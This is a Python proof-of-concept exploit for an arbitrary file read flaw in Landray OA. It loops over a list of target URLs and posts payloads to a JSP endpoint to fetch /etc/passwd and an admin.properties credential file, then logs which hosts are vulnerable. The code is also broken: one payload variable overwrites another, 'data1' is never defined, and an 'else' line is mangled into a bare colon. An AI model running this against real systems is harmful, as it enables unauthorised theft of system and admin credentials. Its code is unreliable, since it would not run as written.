#!/usr/bin/env python
# encoding: utf-8
'''

@Author         : xd
@Date           : 2021-12-09 00:12
@Description    : Landray OA arbitrary file read vulnerability POC.

'''
import requests

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
'''
proxies = {
    "http": "//127.0.0.1:8080"
}
'''
urls = open('urls.txt', 'r').read().split('\n')
data = 'var={"body": {"file": "file:///etc/passwd"}}'
data = 'var={"body": {"file": "/WEB-INF/KmssConfig/admin.properties"}}'
for i in urls:
    fo = open('read_log.txt', 'a')
    url = i + '/sys/ui/extend/varkind/custom.jsp'
    try:
        r = requests.post(url=url, data=data, headers=header, verify=False, timeout=5)
        r1 = requests.post(url=url, data=data1, headers=header, verify=False, timeout=5)
        fo.write("[*] Request, please wait %s\n" % i)
        if (r.status_code == 200 and 'root:' in r.text) or (r1.status_code == 200 and 'password' in r1.text):
            fo.write("[+] %s There is loophole\n" % i)
        :
            fo.write("[-] %s No loopholes\n" % i)
    except Exception as e:
        fo.write("[-] %s The request failed %s\n" % (i, e))

    fo.close()
